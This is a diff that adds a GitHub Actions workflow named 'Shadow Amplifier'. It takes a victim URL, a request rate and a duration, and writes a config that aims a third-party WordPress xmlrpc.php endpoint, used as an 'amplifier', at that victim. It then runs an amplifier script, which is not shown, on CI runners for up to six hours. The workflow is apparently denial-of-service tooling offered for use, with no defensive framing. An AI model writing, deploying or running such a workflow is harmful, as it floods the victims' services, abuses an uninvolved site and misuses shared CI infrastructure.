@@ -1,0 +1,42 @@
+name: Shadow Amplifier
+
+on:
+  workflow_dispatch:
+    inputs:
+      rpm:
+        description: 'Requests per minute'
+        required: true
+        default: '60'
+      duration:
+        description: 'Duration (minutes)'
+        required: true
+        default: '10'
+      victim:
+        description: 'Victim URL'
+        required: true
+        default: 'http://example.com'
+
+jobs:
+  amplify:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - name: Install deps
+        run: pip install requests
+      - name: Update config
+        run: |
+          cat > config.json << EOF
+          {
+              "amplifier_url": "https://physiqueacademy.net/xmlrpc.php",
+              "victim_url": "${{ github.event.inputs.victim }}",
+              "requests_per_minute": ${{ github.event.inputs.rpm }},
+              "duration_minutes": ${{ github.event.inputs.duration }},
+              "threads": 5
+          }
+          EOF
+      - name: Run Amplifier
+        run: python3 scripts/amplifier.py
